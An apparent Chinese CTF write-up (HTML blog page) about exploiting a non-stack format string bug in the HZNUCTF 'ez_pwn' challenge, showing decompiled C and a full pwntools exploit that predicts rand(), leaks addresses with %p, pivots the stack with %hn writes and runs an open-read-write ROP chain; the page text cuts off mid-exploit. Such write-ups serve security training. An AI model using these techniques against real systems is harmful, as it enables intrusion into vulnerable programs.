<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>奇奇怪怪格式化字符串漏洞的利用1 | nyyyddddn</title>
  <meta name="author" content="nyyyddddn">
  
  <meta name="description" content="题目附件https://github.com/nyyyddddn/ctf/tree/main/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A81
非栈上格式化字符串套orwhznuctf_ezpwn
int __cdecl main(int argc, const char **argv, const char **envp)
&amp;#123;
  sand_box(argc, argv, envp);
  rand_time();
  vuln();
  return 0;
&amp;#125;

void rand_time()
&amp;#123;
  char buf[8]; // [rsp+0h] [rbp-10h] BYREF
  unsigned int seed; // [rsp+8h] [rbp-8h] BYREF
  int i; // [rsp+Ch] [rbp-4h]

  seed = time(0LL);
  printf(&#34;welcome to HZNUCTF !&#34;);
  printf(&#34;Please input your name: &#34;);
  read(0, buf, 0x10uLL);
  printf(&#34;Hello, %s\n&#34;, buf);
  puts(&#34;I wonder if you&#39;re lucky enough&#34;);
  srand(seed);
  for ( i = 0; i &amp;lt;= 9; ++i )
  &amp;#123;
    printf(&#34;Let&#39;s guess the number: &#34;);
    __isoc99_scanf(&#34;%d&#34;, &amp;amp;seed);
    if ( rand() != seed )
    &amp;#123;
      puts(&#34;Wrong.&#34;);
      puts(&#34;Guess you weren&#39;t lucky enough.&#34;);
      exit(-1);
    &amp;#125;
    puts(&#34;Right.&#34;);
  &amp;#125;
&amp;#125;

__int64 vuln()
&amp;#123;
  puts(&#34;WOW you really a lucky guy!&#34;);
  puts(&#34;Then I want to know if you are capable enough.&#34;);
  while ( 1 )
  &amp;#123;
    printf(&#34;Please tell us something: &#34;);
    read(0, s1, 0x80uLL);
    if ( !strcmp(s1, &#34;HZNUCTF&#34;) )
      break;
    printf(s1);
  &amp;#125;
  return 0LL;
&amp;#125;

非栈上格式化字符串相对栈上格式化字符串 最麻烦的地方是任意地址写需要通过一个指针去调整另一个指针，一个字节或者是两个字节的写数据，需要两个步骤，有orw的情况下(不考虑这个沙箱能escape的情况)如果能正常退出循环，可以配合栈迁移的方式，把栈迁移到输入地址那进行rop，然后还可以通过二次迁移迁移到已知的地址来做更复杂的操作
exp
from pwn import *
# from LibcSearcher import *
import itertools
import ctypes

context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)

is_debug = 1
IP = &#34;150.158.117.224&#34;
PORT = 20042

elf = context.binary = ELF(&#39;./ez_pwn&#39;)
libc = elf.libc

def connect():
    return remote(IP, PORT) if not is_debug else process()

g = lambda x: gdb.attach(x)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
r = lambda x=None: p.recv() if x is None else p.recv(x)
rl = lambda: p.recvline()
ru = lambda x: p.recvuntil(x)
r_leak_libc_64 = lambda: u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))
r_leak_libc_32 = lambda: u32(p.recvuntil(b&#39;\xf7&#39;)[-4:])

cdll=ctypes.CDLL(&#34;./libc-2.31.so&#34;)


p = connect()

payload=b&#34;a&#34;*8+p32(0)+p32(0x20)
sa(&#34;Please input your name: &#34;,payload)
cdll.srand(0)
for i in range(10):
	payload=cdll.rand()
	sla(&#34;Let&#39;s guess the number: &#34;,str(payload))

payload=b&#34;%6$p%7$p%9$p&#34;+b&#34;HZNUCTF\x00&#34;
sa(&#34;Please tell us something: &#34;,payload)

stack=int(p.recv(14).decode(&#34;utf-8&#34;),16)
log.success(f&#34;rbp-&gt;&amp;#123;hex(stack)&amp;#125;&#34;)
leek_main=int(p.recv(14).decode(&#34;utf-8&#34;),16)
main=leek_main-38
log.success(f&#34;main-&gt;&amp;#123;hex(main)&amp;#125;&#34;)
pie=main-0x14df
log.success(f&#34;pie-&gt;&amp;#123;hex(pie)&amp;#125;&#34;)
libc_base=int(p.recv(14).decode(&#34;utf-8&#34;),16)-libc.sym[&#34;__libc_start_main&#34;]-243
log.success(f&#34;libc_base-&gt;&amp;#123;hex(libc_base)&amp;#125;&#34;)
bss=pie+0x4060
leave_ret=pie+0x1369

payload=f&#34;%&amp;#123;(stack&amp;amp;0xffff)-0x8&amp;#125;c%11$hnHZNUCTF\x00&#34;.encode()
sa(&#34;Please tell us something: &#34;,payload)
payload=f&#34;%&amp;#123;(leave_ret&amp;amp;0xffff)&amp;#125;c%39$hnHZNUCTF\x00&#34;.encode()
sa(&#34;Please tell us something: &#34;,payload)
payload=f&#34;%&amp;#123;(stack&amp;amp;0xffff)+0x28&amp;#125;c%11$hnHZNUCTF\x00&#34;.encode()
sa(&#34;Please tell us something: &#34;,payload)
payload=f&#34;%&amp;#123;(bss&amp;amp;0xffff)&amp;#125;c%39$hnHZNUCTF\x00&#34;.encode()
sa(&#34;Please tell us something: &#34;,payload)
payload=f&#34;%&amp;#123;(stack&amp;amp;0xffff)+0x30&amp;#125;c%11$hnHZNUCTF\x00&#34;.encode()
sa(&#34;Please tell us something: &#34;,payload)
payload=f&#34;%&amp;#123;(leave_ret&amp;amp;0xffff)&amp;#125;c%39$hnHZNUCTF\x00&#34;.encode()
sa(&#34;Please tell us something: &#34;,payload)

payload=f&#34;%&amp;#123;(stack&amp;amp;0xffff)-0x10&amp;#125;c%11$hnHZNUCTF\x00&#34;.encode()
sa(&#34;Please tell us something: &#34;,payload)
payload=f&#34;%&amp;#123;(stack&amp;amp;0xffff)+0x28&amp;#125;c%39$hnHZNUCTF\x00&#34;.encode()
sa(&#34;Please tell us something: &#34;,payload)

open=libc_base+libc.sym[&#34;open&#34;]
read=libc_base+libc.sym[&#34;read&#34;]
write=libc_base+libc.sym[&#34;write&#34;]
pop_rdi=pie+0x1573
pop_rsi=libc_base+0x2601f
pop_rdx=libc_base+0x15fae6
flag=bss+0xe0
buf=bss+0x100

payload=b&#34;HZNUCTF\x00&#34;
payload += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(bss+0x48) + p64(pop_rdx) + p64(0x110) + p64(0)
payload += p64(read)
sa(&#34;Please tell us something: &#34;,payload)

payload = p64(pop_rdi) + p64(flag) + p64(open)
payload += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(buf) + p64(pop_rdx) + p64(0x30) + p64(0) + p64(read) 
payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(buf) + p64(pop_rdx) + p64(0x30) + p64(0) + p64(write)+b&#34;./flag\x00&#34;
s(payload)

p.interactive()

3个字节格式化字符串泄露libccorctf_format-string
source.c"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="奇奇怪怪格式化字符串漏洞的利用1"/>
  <meta property="og:site_name" content="nyyyddddn"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="nyyyddddn" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">nyyyddddn</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/catergories" title="All the categories.">
			  <i class=""></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class=""></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class=""></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> 奇奇怪怪格式化字符串漏洞的利用1</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <p>题目附件<a target="_blank" rel="noopener" href="https://github.com/nyyyddddn/ctf/tree/main/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A81">https://github.com/nyyyddddn/ctf/tree/main/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A81</a></p>
<h2 id="非栈上格式化字符串套orw"><a href="#非栈上格式化字符串套orw" class="headerlink" title="非栈上格式化字符串套orw"></a>非栈上格式化字符串套orw</h2><p>hznuctf_ezpwn</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">sand_box</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">,</span> envp<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">rand_time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">rand_time</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h] BYREF</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> seed<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-8h] BYREF</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-4h]</span>

  seed <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"welcome to HZNUCTF !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please input your name: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x10uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello, %s\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"I wonder if you're lucky enough"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">srand</span><span class="token punctuation">(</span>seed<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">9</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Let's guess the number: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>seed<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> seed <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Wrong."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Guess you weren't lucky enough."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Right."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

__int64 <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"WOW you really a lucky guy!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Then I want to know if you are capable enough."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please tell us something: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> s1<span class="token punctuation">,</span> <span class="token number">0x80uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"HZNUCTF"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>非栈上格式化字符串相对栈上格式化字符串 最麻烦的地方是任意地址写需要通过一个指针去调整另一个指针，一个字节或者是两个字节的写数据，需要两个步骤，有orw的情况下(不考虑这个沙箱能escape的情况)如果能正常退出循环，可以配合栈迁移的方式，把栈迁移到输入地址那进行rop，然后还可以通过二次迁移迁移到已知的地址来做更复杂的操作</p>
<p>exp</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># from LibcSearcher import *</span>
<span class="token keyword">import</span> itertools
<span class="token keyword">import</span> ctypes

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

is_debug <span class="token operator">=</span> <span class="token number">1</span>
IP <span class="token operator">=</span> <span class="token string">"150.158.117.224"</span>
PORT <span class="token operator">=</span> <span class="token number">20042</span>

elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./ez_pwn'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>

g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
r_leak_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leak_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

cdll<span class="token operator">=</span>ctypes<span class="token punctuation">.</span>CDLL<span class="token punctuation">(</span><span class="token string">"./libc-2.31.so"</span><span class="token punctuation">)</span>


p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>

payload<span class="token operator">=</span><span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>
sa<span class="token punctuation">(</span><span class="token string">"Please input your name: "</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
cdll<span class="token punctuation">.</span>srand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	payload<span class="token operator">=</span>cdll<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span>
	sla<span class="token punctuation">(</span><span class="token string">"Let's guess the number: "</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>

payload<span class="token operator">=</span><span class="token string">b"%6$p%7$p%9$p"</span><span class="token operator">+</span><span class="token string">b"HZNUCTF\x00"</span>
sa<span class="token punctuation">(</span><span class="token string">"Please tell us something: "</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

stack<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"rbp-></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
leek_main<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
main<span class="token operator">=</span>leek_main<span class="token operator">-</span><span class="token number">38</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"main-></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
pie<span class="token operator">=</span>main<span class="token operator">-</span><span class="token number">0x14df</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"pie-></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>pie<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
libc_base<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__libc_start_main"</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">243</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"libc_base-></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
bss<span class="token operator">=</span>pie<span class="token operator">+</span><span class="token number">0x4060</span>
leave_ret<span class="token operator">=</span>pie<span class="token operator">+</span><span class="token number">0x1369</span>

payload<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"%</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token punctuation">(</span>stack<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">&#125;</span></span><span class="token string">c%11$hnHZNUCTF\x00"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
sa<span class="token punctuation">(</span><span class="token string">"Please tell us something: "</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"%</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token punctuation">(</span>leave_ret<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">c%39$hnHZNUCTF\x00"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
sa<span class="token punctuation">(</span><span class="token string">"Please tell us something: "</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"%</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token punctuation">(</span>stack<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x28</span><span class="token punctuation">&#125;</span></span><span class="token string">c%11$hnHZNUCTF\x00"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
sa<span class="token punctuation">(</span><span class="token string">"Please tell us something: "</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"%</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token punctuation">(</span>bss<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">c%39$hnHZNUCTF\x00"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
sa<span class="token punctuation">(</span><span class="token string">"Please tell us something: "</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"%</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token punctuation">(</span>stack<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x30</span><span class="token punctuation">&#125;</span></span><span class="token string">c%11$hnHZNUCTF\x00"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
sa<span class="token punctuation">(</span><span class="token string">"Please tell us something: "</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"%</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token punctuation">(</span>leave_ret<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">c%39$hnHZNUCTF\x00"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
sa<span class="token punctuation">(</span><span class="token string">"Please tell us something: "</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

payload<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"%</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token punctuation">(</span>stack<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token punctuation">&#125;</span></span><span class="token string">c%11$hnHZNUCTF\x00"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
sa<span class="token punctuation">(</span><span class="token string">"Please tell us something: "</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"%</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token punctuation">(</span>stack<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x28</span><span class="token punctuation">&#125;</span></span><span class="token string">c%39$hnHZNUCTF\x00"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
